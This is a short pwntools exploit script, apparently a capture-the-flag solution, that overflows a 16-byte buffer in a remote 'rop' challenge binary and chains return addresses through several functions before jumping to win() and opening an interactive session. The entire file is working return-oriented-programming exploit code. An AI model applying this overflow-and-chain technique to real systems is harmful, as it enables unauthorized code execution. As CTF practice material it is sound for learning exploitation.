# exploit_rop.py

from pwn import *

# r = process("./rop")
r = remote("ctf.umbccd.io", 4100)

loot_lake = 0x8049248 # address of loot_lake()
lonely_lodge = 0x80492e2 # address of lonely_lodge()
tilted_towers = 0x804937c # address of tilted_towers()
snobby_shores = 0x8049416 # address of snobby_shores()
dusty_depot = 0x80494b0 # address of dusty_depot()
junk_junction = 0x804954a # address of junk_junction()
greasy_grove = 0x80495e4 # address of greasy_grove()
win = 0x804967e # address of win()
tryme = 0x80496ca # address of tryme()

r.recvuntil("So where we roppin boys?\n")

dummy = "A" * 0x10

payload = dummy + p32(tilted_towers) + p32(tryme)
r.send(payload)

payload = dummy + p32(junk_junction) + p32(tryme)
r.send(payload)

payload = dummy + p32(snobby_shores) + p32(tryme)
r.send(payload)

payload = dummy + p32(greasy_grove) + p32(tryme)
r.send(payload)

payload = dummy + p32(lonely_lodge) + p32(tryme)
r.send(payload)

payload = dummy + p32(dusty_depot) + p32(tryme)
r.send(payload)

payload = dummy + p32(win)
r.sendline(payload)

r.interactive()